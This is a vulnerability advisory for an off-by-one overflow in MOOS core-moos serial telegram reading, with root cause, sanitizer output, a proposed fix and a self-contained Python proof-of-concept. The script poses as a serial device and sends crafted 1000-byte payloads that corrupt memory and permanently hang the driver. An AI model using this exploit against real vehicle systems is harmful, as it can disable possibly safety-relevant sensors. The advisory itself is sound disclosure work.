# MOOS core-moos: Off-by-One Buffer Overflow in Serial Telegram Handling

- **Advisory ID:** MCSAID-2026-040
- **CVE ID:** [CVE-2026-85454](https://www.cve.org/CVERecord?id=CVE-2026-85454)
- **Published:** 2026-09-01
- **Severity:** Medium (CVSS 6.1 – CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)
- **CVSS 4.0:** 5.2 (CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N)
- **Vulnerability type:** Off-by-one Error
- **Current state:** No fixed release; proposed fix submitted upstream in [Pull Request #73](https://github.com/themoos/core-moos/pull/73) (not merged)
- **Software:** [MOOS core-moos](https://github.com/themoos/core-moos)
- **CWE:** [CWE-193: Off-by-one Error](https://cwe.mitre.org/data/definitions/193.html)
- **Discovered by:** Vlatko Kosturjak of Marlink Cyber

---

## Summary

The serial telegram reader admits up to `TELEGRAM_LEN` payload bytes and then writes the NUL terminator at index `TELEGRAM_LEN`, one byte past the buffer. In the accumulating variant the buffer is `static`, so the stray byte lands in the data segment; and once it fills without a terminator, the loop condition is permanently false and the port can never read again.

---

## Affected Versions

| Version | Status |
|---------|--------|
| core-moos <= 10.4.0 | Vulnerable |

Tested against: core-moos `v10.4.0-49-gec9c77c` (commit `ec9c77c68fcbdef8f5e4c60fe243acd223433f0c`), latest master; and MOOS-IvP `1de9ae146cd63c209e8c3fd81611a4ed2472971b`, latest master, which bundles the same code.

---

## Impact

One-byte out-of-bounds write (stack or static) and a permanent hang of the
serial driver.  For a vehicle that is loss of a sensor - possibly a
safety-relevant one - with no recovery short of a restart.

---

## Exploitation

Whatever is on the other end of the serial line: a field sensor, GPS, compass, acoustic modem, or anything that can inject into that link.

Preconditions:

* Any MOOS driver that uses CMOOSSerialPort::GetTelegram or GetTelegramOrAccumulate on a non-streaming device.

---

## Details

### Affected code

Each affected file is listed twice: first at its path in **core-moos** git master (commit `ec9c77c`), which is where a fix has to land, then at its path inside the copy bundled in MOOS-IvP under `MOOS_Jul2724/MOOSCore`. The two copies are byte-identical unless stated otherwise.

* **`Core/libMOOS/Utils/MOOSSerialPort.cpp`** - lines 561-600: GetTelegram(): char pData[TELEGRAM_LEN]; while(... && nRead<TELEGRAM_LEN) { nRead += 1; if(IsCompleteReply(...)) pData[nRead]='\0'; }  - nRead can be TELEGRAM_LEN
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Utils/MOOSSerialPort.cpp`** - lines 561-600: GetTelegram(): char pData[TELEGRAM_LEN]; while(... && nRead<TELEGRAM_LEN) { nRead += 1; if(IsCompleteReply(...)) pData[nRead]='\0'; }  - nRead can be TELEGRAM_LEN
* **`Core/libMOOS/Utils/MOOSSerialPort.cpp`** - lines 621-660: GetTelegramOrAccumulate(): identical, but the buffer is `static char telegramBuffer[TELEGRAM_LEN]`, so the stray byte lands in global memory; and once nTelegramBufferRead reaches TELEGRAM_LEN the while condition is false forever
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Utils/MOOSSerialPort.cpp`** - lines 621-660: GetTelegramOrAccumulate(): identical, but the buffer is `static char telegramBuffer[TELEGRAM_LEN]`, so the stray byte lands in global memory; and once nTelegramBufferRead reaches TELEGRAM_LEN the while condition is false forever
* **`Core/libMOOS/Utils/include/MOOS/libMOOS/Utils/MOOSSerialPort.h`** - line 42: #define TELEGRAM_LEN 1000
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Utils/include/MOOS/libMOOS/Utils/MOOSSerialPort.h`** - line 42: #define TELEGRAM_LEN 1000
* **`Core/libMOOS/Utils/MOOSSerialPort.cpp`** - lines 248-262: IsCompleteReply() default: return (nRead>0 && pData[nRead-1]==GetTermCharacter()) - so the 1000th byte being the terminator is sufficient
* **`MOOS_Jul2724/MOOSCore/Core/libMOOS/Utils/MOOSSerialPort.cpp`** - lines 248-262: IsCompleteReply() default: return (nRead>0 && pData[nRead-1]==GetTermCharacter()) - so the 1000th byte being the terminator is sufficient

### Root cause

The read loop admits up to `TELEGRAM_LEN` payload bytes; no byte is reserved for
the terminator.  When the 1000th byte is the termination character, `nRead`
equals 1000 and `pData[1000] = '\0'` writes one byte past the array.  In
`GetTelegram` that is the stack frame; in `GetTelegramOrAccumulate` the buffer is
`static`, so the stray byte lands in the data segment where it persists and can
corrupt an adjacent object.

Separately, if 1000 bytes arrive with no terminator, `nTelegramBufferRead` stays
at 1000 and the `while` condition is permanently false, so the port can never
read anything again.

---

## Reproduction

### Test environment

Ubuntu 24.04, x86-64, gcc 13.3.0, cmake 3.28.3, FLTK 1.3.8, Python 3.14.

All four MOOS repositories were built from source with their default settings -
Release `-O2`, and every resulting binary is a hardened PIE with a stack canary,
FORTIFY, NX and full RELRO:

| Repository | Version | Built with |
| --- | --- | --- |
| core-moos | `v10.4.0-49-gec9c77c` (`ec9c77c`) | `cmake .. && make` |
| essential-moos | `10.0.1-release-22-gb897ea8` (`b897ea8`) | `cmake -DMOOS_DIR=<core-moos build> .. && make` |
| ui-moos | commit `50b9c6c` | `cmake -DBUILD_GRAPHICAL_TOOLS=ON -DBUILD_UMS=ON -DMOOS_DIR=<core-moos build> .. && make` |
| MOOS-IvP | `1de9ae146cd63c209e8c3fd81611a4ed2472971b` | `./build-moos.sh && ./build-ivp.sh` |

The affected code lives in **core-moos** (`v10.4.0-49-gec9c77c`, commit `ec9c77c`) and is also bundled inside MOOS-IvP under `MOOS_Jul2724/MOOSCore`. Both copies were checked; unless noted otherwise in the text they are byte-identical, so a fix belongs in core-moos and MOOS-IvP needs to pick it up.

#### Tested / reproduced

Yes - reproduced against standalone core-moos `v10.4.0-49-gec9c77c`, driving the real `CMOOSLinuxSerialPort` through a pty pair: both out-of-bounds writes and the permanent wedge, at `Core/libMOOS/Utils/MOOSSerialPort.cpp:595` and `:656`.

### Steps and results

Driven through a pty pair with the real `CMOOSLinuxSerialPort`:

    GetTelegram, 1000 bytes ending in '\n':
      MOOSSerialPort.cpp:595: runtime error: index 1000 out of bounds for
          type 'char [1000]'
      ERROR: AddressSanitizer: stack-buffer-overflow ... WRITE of size 1
          #0 CMOOSSerialPort::GetTelegram(...) MOOSSerialPort.cpp:595

    GetTelegramOrAccumulate, same input:
      ERROR: AddressSanitizer: global-buffer-overflow ... WRITE of size 1
          #0 CMOOSSerialPort::GetTelegramOrAccumulate(...) MOOSSerialPort.cpp:656

    wedge case (1000 bytes, no terminator):
      GetTelegramOrAccumulate returned 0
      follow-up short telegram "HELLO\n": returned 0
      PORT_WEDGED=1

### Proof of concept

Standalone and self-contained - Python 3 standard library only (or a POSIX shell). It attacks an already-running production
binary and does **not** start the target itself; the launch
commands are in the header comment.

```python
#!/usr/bin/env python3
"""
CMOOSSerialPort - one-byte out-of-bounds write, and a permanent driver wedge

MOOS_Jul2724/MOOSCore/Core/libMOOS/Utils/MOOSSerialPort.cpp
(identical in core-moos Core/libMOOS/Utils/MOOSSerialPort.cpp)

    GetTelegram (l.561-600)
        char pData[TELEGRAM_LEN];                       // 1000 bytes
        while ((dfTimeWaited<dfTimeOut) && nRead<TELEGRAM_LEN) {
            nGrabbed = GrabN(pData+nRead,1);
            ...
            nRead += nGrabbed;                          // may reach 1000
            if(IsCompleteReply(pData,TELEGRAM_LEN,nRead)) {
                pData[nRead]='\0';                      // pData[1000]  <-- OOB

    GetTelegramOrAccumulate (l.621-660) is the same shape, but its buffer is
        static char telegramBuffer[TELEGRAM_LEN];
    so the stray byte lands in the DATA SEGMENT where it persists; and once
    nTelegramBufferRead reaches 1000 without a terminator the while condition
    is false forever and the port can never read anything again.

    IsCompleteReply (l.248-262) defaults to
        return (nRead>0 && pData[nRead-1]==GetTermCharacter());
    so the attacker only needs the 1000th byte to be the terminator.

No byte is reserved for the NUL.

THREAT MODEL
------------
Whatever is on the other end of the serial line: a GPS, compass, acoustic
modem, INS, or anything that can inject into that link.  This exploit plays the
role of the device.

TARGET
------
Any MOOS driver that calls CMOOSSerialPort::GetTelegram or
GetTelegramOrAccumulate on a non-streaming device.

HOW TO LAUNCH THE TARGET (this exploit does NOT launch anything itself)
    This exploit creates a pty pair and prints the slave device name.  Point the
    driver at that device, then press Enter here.

        ./exploit.py
        # -> "device ready at /dev/pts/N"
        # in another shell, start the driver against /dev/pts/N, e.g. a
        # CMOOSSerialPort-based iSomething with  Port = /dev/pts/N
        # then press Enter in the exploit's shell

    To SEE the out-of-bounds write rather than only its effect, run the driver
    from a sanitised build.

USAGE
-----
    ./exploit.py [case]
      case: telegram | accumulate | wedge | all   (default all)
"""
import os
import pty
import sys
import time

CASE = sys.argv[1] if len(sys.argv) > 1 else 'all'
TELEGRAM_LEN = 1000           # MOOSSerialPort.h:42

master, slave = pty.openpty()
name = os.ttyname(slave)
print("[*] device ready at %s" % name)
print("    point the MOOS driver at this device, then press Enter here.")
print("    (the driver must use GetTelegram / GetTelegramOrAccumulate)")
try:
    input()
except EOFError:
    pass

def send(payload, label):
    print("\n[*] %s" % label)
    os.write(master, payload)
    print("    wrote %d bytes" % len(payload))
    time.sleep(2)

if CASE in ('telegram', 'accumulate', 'all'):
    # exactly TELEGRAM_LEN bytes, the last one being the terminator
    payload = b'A' * (TELEGRAM_LEN - 1) + b'\n'
    send(payload, "exactly %d bytes, the %dth being the terminator '\\n'"
         % (TELEGRAM_LEN, TELEGRAM_LEN))
    print("    -> nRead == %d, then pData[%d] = '\\0'"
          % (TELEGRAM_LEN, TELEGRAM_LEN))
    print("    -> stack-buffer-overflow  in GetTelegram (MOOSSerialPort.cpp:595)")
    print("    -> global-buffer-overflow in GetTelegramOrAccumulate (:656)")
    print("       because that buffer is `static`, so the stray byte persists")

if CASE in ('wedge', 'all'):
    send(b'A' * TELEGRAM_LEN,
         "%d bytes with NO terminator - wedges the accumulator" % TELEGRAM_LEN)
    print("    -> nTelegramBufferRead stays at %d, so the while condition is"
          % TELEGRAM_LEN)
    print("       permanently false and the port can never read again")
    send(b'HELLO\n', "a perfectly valid short telegram, after the wedge")
    print("    -> GetTelegramOrAccumulate returns false and always will;")
    print("       the driver has lost its sensor with no recovery short of a")
    print("       restart")

os.close(master)
os.close(slave)
print("""
====================================================================
IMPACT
  A one-byte out-of-bounds write - on the stack in GetTelegram, in the DATA
  SEGMENT in GetTelegramOrAccumulate - plus a permanent hang of the serial
  driver.  For a vehicle that is loss of a sensor, possibly a safety-relevant
  one, with no recovery short of a restart.
  Reproduced with the project's own CMOOSLinuxSerialPort through a pty:
    ERROR: AddressSanitizer: stack-buffer-overflow  WRITE of size 1
      #0 CMOOSSerialPort::GetTelegram(...)            MOOSSerialPort.cpp:595
    ERROR: AddressSanitizer: global-buffer-overflow WRITE of size 1
      #0 CMOOSSerialPort::GetTelegramOrAccumulate(...) MOOSSerialPort.cpp:656
    PORT_WEDGED=1
====================================================================""")

```

---

## Mitigations

A fix has been proposed upstream but has not been merged at the time of writing:

- Pull request: [Pull Request #73](https://github.com/themoos/core-moos/pull/73)
- Proposed fix commit: [befb04df2039](https://github.com/themoos/core-moos/commit/befb04df2039d0080715ea35f56268092db4ec0f)

### Recommended fix

Reserve the terminator: declare the buffer `TELEGRAM_LEN+1` bytes, or cap the
loop at `nRead < TELEGRAM_LEN-1`.  When the buffer fills without a terminator,
discard the accumulated bytes, log it, and reset the counter so the port
recovers.  Prefer returning a `std::string` sized from `nRead` over
NUL-terminating a raw array, and make the accumulator a member rather than a
function-level `static` (which is also not thread-safe across two ports).

---

## Recommendations

- Apply the proposed fix from [Pull Request #73](https://github.com/themoos/core-moos/pull/73) until an official upstream release contains it.
- MOOS has no authentication or transport security; only expose MOOSDB and inter-community (pShare / pMOOSBridge / uFld*) ports on isolated, trusted networks and filter them at the network boundary.

---

## Timeline

- 2026-09-01 – CVE-2026-85454 published
- 2026-10-13 – Marlink Cyber advisory released

---

## References

- CVE record: [CVE-2026-85454](https://www.cve.org/CVERecord?id=CVE-2026-85454)
- VulnCheck advisory: [MOOS core-moos through 10.4.0 Off-by-One Buffer Overflow in Serial Telegram Handling](https://www.vulncheck.com/advisories/moos-core-moos-through-10.4.0-off-by-one-buffer-overflow-in-serial-telegram-handling)
- Upstream pull request: [Pull Request #73](https://github.com/themoos/core-moos/pull/73)
- Proposed fix commit: [befb04df2039d0080715ea35f56268092db4ec0f](https://github.com/themoos/core-moos/commit/befb04df2039d0080715ea35f56268092db4ec0f)
- Marlink Cyber Security Advisory: [MCSAID-2026-040](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-040-core-moos-off-by-one-buffer-overflow-in-serial-telegram-handling.md)
- Software: [MOOS core-moos](https://github.com/themoos/core-moos)
